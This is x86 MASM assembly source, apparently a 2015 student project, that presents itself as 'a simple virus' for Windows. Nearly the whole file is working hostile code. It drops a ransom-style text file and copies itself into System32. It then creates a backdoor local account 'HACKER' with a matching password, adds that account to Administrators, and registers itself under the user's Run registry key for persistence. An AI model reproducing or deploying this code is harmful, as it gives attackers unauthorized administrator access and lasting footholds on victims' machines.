;Description: A simple virus that creates a text file in C:, creates a copy of itself in C:\Windows\System32 directory 
     ;and adds itself to the startup registry of the current user.
;Written By: Urmila Sharma and Bijay Regmi
;Submission Date: 05/07/2015

.model flat, stdcall
OPTION CASEMAP : NONE



INCLUDE windows.inc
INCLUDE kernel32.inc
INCLUDE msvcrt.inc
INCLUDELIB msvcrt.lib
INCLUDELIB kernel32.lib

system PROTO C, command:PTR BYTE

.data
fileName BYTE "echo Your machine is infected. > C:\Virus.txt", 0

copyLocation BYTE "C:\Windows\System32\virus.exe", 0

createUserPrompt BYTE "net user HACKER HACKER /ADD > NUL", 0
addAsAdministratorPrompt BYTE "net localgroup Administrators HACKER /ADD > NUL", 0

addToRegPrompt BYTE 'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v null /t REG_SZ /d "C:\Windows\System32\Virus.exe" /f > NUL', 0
pathOfVirus BYTE 512 DUP(?)


.code

main PROC

	PUSH OFFSET fileName
	CALL system         ;Creates a file called Virus.txt and writes Your machine is infected in it.

	Push 512                      ; the size of the variable that stores the path
	PUSH OFFSET pathOfVirus       ; Pointer to store the path
	PUSH NULL                     ;Argument to get the path of executable file of current process i.e Virus.exe
	CALL GetModuleFileName             ;Gets the location of virus.exe
	
	PUSH FALSE                    
	PUSH OFFSET copyLocation      ;the location to copy the file
	PUSH OFFSET pathOfVirus       ; the location from where to copy
	CALL CopyFile                 ; copies the file
	
	PUSH OFFSET createUserPrompt
	CALL system                   ; creates a new user named HACKER and sets its password to HACKER

	PUSH OFFSET addAsAdministratorPrompt
	CALL system                        ; adds the user HACKER as administrator

	PUSH OFFSET addToRegPrompt
	CALL system                        ; adds the Virus.exe file from C:\Windows\System32 directory to the registry of current user

	CALL ExitProcess
main ENDP
END main